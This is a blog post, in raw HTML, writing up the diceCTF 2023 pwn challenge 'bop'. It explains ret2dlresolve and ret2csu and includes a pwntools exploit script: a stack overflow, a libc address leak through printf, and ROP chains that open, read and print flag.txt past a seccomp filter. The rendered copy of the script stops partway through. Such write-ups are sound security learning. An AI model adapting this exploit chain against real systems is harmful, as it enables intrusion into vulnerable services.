<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>diceCTF 2023 - pwn: bop | All Things Cyber – joonkim0625</title>
<meta name="keywords" content="ctf, dicectf 2023, cybersecurity, binary exploit, ghidra, python, script, ret2csu, ret2dlresolve">
<meta name="description" content="PWN: bop
I didn&rsquo;t get to solve this by my own but there were many interesting things
that I wasn&rsquo;t aware of that can be used to solve this challenge. However, I
wanted to talk about a few things I got to know during the struggle of working
on this challenge.
ret2dlresovle

References:

https://syst3mfailure.io/ret2dl_resolve
https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve



When a binary uses the shared libraries by dynamically linking to them, they do
not have (or know) all the addresses for those library functions as the program starts up.
They would resolve this issue (finding the addresses of those functions) when
the functions are actually called. And the trick in this technique is to force
the dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts.
The pwntools python library allows us to choose the functions of our choice
and and use them as their addresses were already resolved.">
<meta name="author" content="Joon Kim">
<link rel="canonical" href="https://joonkim0625.github.io/posts/2023-2-06-dicectf2023-pwn-bop/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2023-2-06-dicectf2023-pwn-bop/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2023-2-06-dicectf2023-pwn-bop/">
  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
  <meta property="og:title" content="diceCTF 2023 - pwn: bop">
  <meta property="og:description" content="PWN: bop I didn’t get to solve this by my own but there were many interesting things that I wasn’t aware of that can be used to solve this challenge. However, I wanted to talk about a few things I got to know during the struggle of working on this challenge.
ret2dlresovle References: https://syst3mfailure.io/ret2dl_resolve https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve When a binary uses the shared libraries by dynamically linking to them, they do not have (or know) all the addresses for those library functions as the program starts up. They would resolve this issue (finding the addresses of those functions) when the functions are actually called. And the trick in this technique is to force the dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts. The pwntools python library allows us to choose the functions of our choice and and use them as their addresses were already resolved.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-02-06T00:00:00+00:00">
    <meta property="article:modified_time" content="2023-02-06T00:00:00+00:00">
    <meta property="article:tag" content="CTF">
    <meta property="article:tag" content="Dicectf 2023">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="Binary Exploit">
    <meta property="article:tag" content="Ghidra">
    <meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="diceCTF 2023 - pwn: bop">
<meta name="twitter:description" content="PWN: bop
I didn&rsquo;t get to solve this by my own but there were many interesting things
that I wasn&rsquo;t aware of that can be used to solve this challenge. However, I
wanted to talk about a few things I got to know during the struggle of working
on this challenge.
ret2dlresovle

References:

https://syst3mfailure.io/ret2dl_resolve
https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve



When a binary uses the shared libraries by dynamically linking to them, they do
not have (or know) all the addresses for those library functions as the program starts up.
They would resolve this issue (finding the addresses of those functions) when
the functions are actually called. And the trick in this technique is to force
the dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts.
The pwntools python library allows us to choose the functions of our choice
and and use them as their addresses were already resolved.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://joonkim0625.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "diceCTF 2023 - pwn: bop",
      "item": "https://joonkim0625.github.io/posts/2023-2-06-dicectf2023-pwn-bop/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "diceCTF 2023 - pwn: bop",
  "name": "diceCTF 2023 - pwn: bop",
  "description": "PWN: bop I didn\u0026rsquo;t get to solve this by my own but there were many interesting things that I wasn\u0026rsquo;t aware of that can be used to solve this challenge. However, I wanted to talk about a few things I got to know during the struggle of working on this challenge.\nret2dlresovle References: https://syst3mfailure.io/ret2dl_resolve https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve When a binary uses the shared libraries by dynamically linking to them, they do not have (or know) all the addresses for those library functions as the program starts up. They would resolve this issue (finding the addresses of those functions) when the functions are actually called. And the trick in this technique is to force the dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts. The pwntools python library allows us to choose the functions of our choice and and use them as their addresses were already resolved.\n",
  "keywords": [
    "ctf", "dicectf 2023", "cybersecurity", "binary exploit", "ghidra", "python", "script", "ret2csu", "ret2dlresolve"
  ],
  "articleBody": "PWN: bop I didn’t get to solve this by my own but there were many interesting things that I wasn’t aware of that can be used to solve this challenge. However, I wanted to talk about a few things I got to know during the struggle of working on this challenge.\nret2dlresovle References: https://syst3mfailure.io/ret2dl_resolve https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve When a binary uses the shared libraries by dynamically linking to them, they do not have (or know) all the addresses for those library functions as the program starts up. They would resolve this issue (finding the addresses of those functions) when the functions are actually called. And the trick in this technique is to force the dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts. The pwntools python library allows us to choose the functions of our choice and and use them as their addresses were already resolved.\nret2csu References: https://ir0nstone.gitbook.io/notes/types/stack/ret2csu https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf https://bananamafia.dev/post/x64-rop-redpwn/ I somehow got to know about this technique - ret2csu is to find more registers (so gadgets) when there aren’t enough gadgets to use. It is possible when a binary is dynamically linked to some code (such as glibc), __libc_csu_init() gets invoked before main(). This function is where we can gather some useful gadgets.\ncommon exploit Another aspect about this challenge is that there are only a few syscall that are allowed to be used due to the seccomp setup. And there is no syscall used in the main function so we will need to leak the address of a libc function and then find syscalls from the libc. This solution was great that it breaks down each component of their exploit so it was good for me to look at each functionality to understand how the attack was crafted. Here is my modified version of their solution with some comments for my own good.\nfrom pwn import * #p = process(\"./bop\") p = remote(\"mc.ax\", \"30284\") #p = pwn.gdb.debug('./bop', #''' #b *0x4012f9 #''' #) offset = 40 elf = context.binary = ELF(\"./bop\") libc = ELF(\"./libc-2.31.so\") main_addr = 0x4012f9 empty_addr = 0x405000 - 0x100 # this is to be used later flag_size = 0x60 rop = ROP(elf) pop_rdi = 0x4013d3 ret = 0x40101a # leak libc payload = b\"a\" * 40 payload += p64(pop_rdi) payload += p64(elf.got['printf']) payload += p64(ret) payload += p64(elf.plt['printf']) payload += p64(ret) payload += p64(main_addr) p.sendlineafter(b\"Do you bop?\", payload) p.recvuntil(b' ') # reading in 6 bytes then fill the rest of 00 # unpacks the value as little-endian integer leak = u64(p.recv(6).ljust(8, b\"\\x00\")) log.info(\"printing leak: 0x%x\" % leak) # this is 'leak of printf' - 'offset of printf' = 'libc base addr' # until libc.address is set, libc.sym[] will get you the offests only libc.address = leak - libc.sym['printf'] # make sure the address ends with 000 --- appropriate alignment log.info(\"libc addr: 0x%x\" %libc.address) # new ropper rl = ROP(libc) # read the flag in --- 'flag.txt\\0' # read from the stdin - fd of 0 # read into the memory segment with 'w' permission bit on # size of 0x10 should be enough # then call the read func --- libc.sym['read'] ---\u003e now the offsets to the # syscalls should have been resolved to the address to the read call payload = b\"a\" * 40 payload += p64(pop_rdi) payload += p64(0x0) payload += p64(rl.find_gadget(['pop rsi', 'ret'])[0]) payload += p64(empty_addr) payload += p64(rl.find_gadget(['pop rdx', 'ret'])[0]) payload += p64(0x10) payload += p64(libc.sym['read']) payload += p64(main_addr) p.sendlineafter(b\"Do you bop?\",payload) # don't forget to actually type \"flag.txt\\0\" in p.sendline(b\"flag.txt\\0\") # open the flag file now payload = b\"a\" * 40 payload += p64(pop_rdi) payload += p64(empty_addr) # we saved 'flag.txt\\0' here payload += p64(rl.find_gadget(['pop rsi', 'ret'])[0]) payload += p64(constants.O_RDONLY) # setting read only flag payload += p64(rl.find_gadget(['pop rax', 'ret'])[0]) payload += p64(constants.SYS_open) # open syscall number should be in rax # done setting up registers, call 'syscall' #payload += p64(rl.find_gadget(['syscall', 'ret'])[0]) print(hex(rl.find_gadget(['syscall', 'ret'])[0])) #print(hex(libc.address + 0x0630a9)) payload += p64(libc.address + 0x0630a9) payload += p64(main_addr) p.sendlineafter(b\"Do you bop?\", payload) # read the file in using the fd returned from opening the file # could not get the below idea working # getting fd into rdi 0x05b521 is mov rax ,rdi # libc.address + 0x05b521 will get that gadget # reusing the read/writable memory segment payload = b\"a\" * 40 payload += p64(pop_rdi) payload += p64(0x3) # assuming payload += p64(rl.find_gadget(['pop rsi', 'ret'])[0]) payload += p64(empty_addr) payload += p64(rl.find_gadget(['pop rdx', 'ret'])[0]) payload += p64(flag_size) payload += p64(rl.find_gadget(['pop rax', 'ret'])[0]) payload += p64(constants.SYS_read) payload += p64(rl.find_gadget(['syscall', 'ret'])[0]) payload += p64(main_addr) p.sendlineafter(b\"Do you bop?\", payload) # write to stdout payload = b\"a\" * 40 payload += p64(pop_rdi) payload += p64(0x1) # we saved 'flag.txt\\0' here payload += p64(rl.find_gadget(['pop rsi', 'ret'])[0]) payload += p64(empty_addr) # setting read only flag payload += p64(rl.find_gadget(['pop rdx', 'ret'])[0]) payload += p64(flag_size) payload += p64(rl.find_gadget(['pop rax', 'ret'])[0]) payload += p64(constants.SYS_write) # open syscall number should be in rax # done setting up registers, call 'syscall' payload += p64(rl.find_gadget(['syscall', 'ret'])[0]) payload += p64(main_addr) p.sendlineafter(b\"Do you bop?\", payload) p.interactive() Misc This challenge provided the libc file through the dockerfile. So there was not really a need of finding offsets of libc functions to find a libc version from the known database (and some people complained that using this method wasn’t really working).\nConclusion It was a fun(?) challenge and I picked up many new things. There are so many things I still don’t know! That is the beauty I guess!\n",
  "wordCount" : "905",
  "inLanguage": "en",
  "datePublished": "2023-02-06T00:00:00Z",
  "dateModified": "2023-02-06T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Joon Kim"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://joonkim0625.github.io/posts/2023-2-06-dicectf2023-pwn-bop/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "All Things Cyber – joonkim0625",
    "logo": {
      "@type": "ImageObject",
      "url": "https://joonkim0625.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://joonkim0625.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://joonkim0625.github.io/about/" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      diceCTF 2023 - pwn: bop
    </h1>
    <div class="post-meta"><span title='2023-02-06 00:00:00 +0000 UTC'>February 6, 2023</span>&nbsp;·&nbsp;Joon Kim

</div>
  </header> 
  <div class="post-content"><h2 id="pwn-bop">PWN: bop<a hidden class="anchor" aria-hidden="true" href="#pwn-bop">#</a></h2>
<p>I didn&rsquo;t get to solve this by my own but there were many interesting things
that I wasn&rsquo;t aware of that can be used to solve this challenge. However, I
wanted to talk about a few things I got to know during the struggle of working
on this challenge.</p>
<h3 id="ret2dlresovle">ret2dlresovle<a hidden class="anchor" aria-hidden="true" href="#ret2dlresovle">#</a></h3>
<ul>
<li>References:
<ul>
<li><a href="https://syst3mfailure.io/ret2dl_resolve">https://syst3mfailure.io/ret2dl_resolve</a></li>
<li><a href="https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve">https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve</a></li>
</ul>
</li>
</ul>
<p>When a binary uses the shared libraries by dynamically linking to them, they do
not have (or know) all the addresses for those library functions as the program starts up.
They would resolve this issue (finding the addresses of those functions) when
the functions are actually called. And the trick in this technique is to force
the dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts.
The <code>pwntools</code> python library allows us to choose the functions of our choice
and and use them as their addresses were already resolved.</p>
<h3 id="ret2csu">ret2csu<a hidden class="anchor" aria-hidden="true" href="#ret2csu">#</a></h3>
<ul>
<li>References:
<ul>
<li><a href="https://ir0nstone.gitbook.io/notes/types/stack/ret2csu">https://ir0nstone.gitbook.io/notes/types/stack/ret2csu</a></li>
<li><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></li>
<li><a href="https://bananamafia.dev/post/x64-rop-redpwn/">https://bananamafia.dev/post/x64-rop-redpwn/</a></li>
</ul>
</li>
</ul>
<p>I somehow got to know about this technique - <code>ret2csu</code> is to find more registers
(so gadgets)
when there aren&rsquo;t enough gadgets to use. It is possible when a binary
is dynamically linked to some code (such as glibc), <code>__libc_csu_init()</code> gets
invoked before <code>main()</code>. This function is where we can gather some useful
gadgets.</p>
<h3 id="common-exploit">common exploit<a hidden class="anchor" aria-hidden="true" href="#common-exploit">#</a></h3>
<p>Another aspect about this challenge is that there are only a few syscall that are
allowed to be used due to the seccomp setup. And there is no syscall used in the
main function so we will need to leak the address of a libc function and then
find syscalls from the libc. <a href="https://ctftime.org/writeup/36143">This</a> solution
was great that it breaks down each component of their exploit so it was good for
me to look at each functionality to understand how the attack was crafted. Here
is my modified version of their solution with some comments for my own good.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#34;./bop&#34;)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;mc.ax&#34;</span>, <span style="color:#e6db74">&#34;30284&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = pwn.gdb.debug(&#39;./bop&#39;,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#b *0x4012f9</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bop&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4012f9</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>empty_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x405000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># this is to be used later </span>
</span></span><span style="display:flex;"><span>flag_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x60</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4013d3</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak libc </span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(ret)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;printf&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(ret)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(main_addr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Do you bop?&#34;</span>, payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># reading in 6 bytes then fill the rest of 00</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># unpacks the value as little-endian integer</span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;printing leak: 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> leak)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># this is &#39;leak of printf&#39; - &#39;offset of printf&#39; = &#39;libc base addr&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># until libc.address is set, libc.sym[] will get you the offests only</span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;printf&#39;</span>] 
</span></span><span style="display:flex;"><span><span style="color:#75715e"># make sure the address ends with 000 --- appropriate alignment</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc addr: 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>libc<span style="color:#f92672">.</span>address) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># new ropper </span>
</span></span><span style="display:flex;"><span>rl <span style="color:#f92672">=</span> ROP(libc)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read the flag in --- &#39;flag.txt\0&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read from the stdin - fd of 0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read into the memory segment with &#39;w&#39; permission bit on</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># size of 0x10 should be enough </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># then call the read func --- libc.sym[&#39;read&#39;] ---&gt; now the offsets to the</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># syscalls should have been resolved to the address to the read call</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rsi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(empty_addr)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdx&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x10</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;read&#39;</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(main_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Do you bop?&#34;</span>,payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># don&#39;t forget to actually type &#34;flag.txt\0&#34; in</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># open the flag file now</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(empty_addr) <span style="color:#75715e"># we saved &#39;flag.txt\0&#39; here</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rsi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(constants<span style="color:#f92672">.</span>O_RDONLY) <span style="color:#75715e"># setting read only flag</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rax&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(constants<span style="color:#f92672">.</span>SYS_open) <span style="color:#75715e"># open syscall number should be in rax </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># done setting up registers, call &#39;syscall&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#payload += p64(rl.find_gadget([&#39;syscall&#39;, &#39;ret&#39;])[0]) </span>
</span></span><span style="display:flex;"><span>print(hex(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;syscall&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]))
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(hex(libc.address + 0x0630a9))</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0630a9</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(main_addr)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Do you bop?&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read the file in using the fd returned from opening the file</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># could not get the below idea working</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># getting fd into rdi 0x05b521 is mov rax ,rdi</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># libc.address + 0x05b521 will get that gadget</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># reusing the read/writable memory segment</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x3</span>) <span style="color:#75715e"># assuming</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rsi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(empty_addr)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(rl<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdx&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(flag_size)
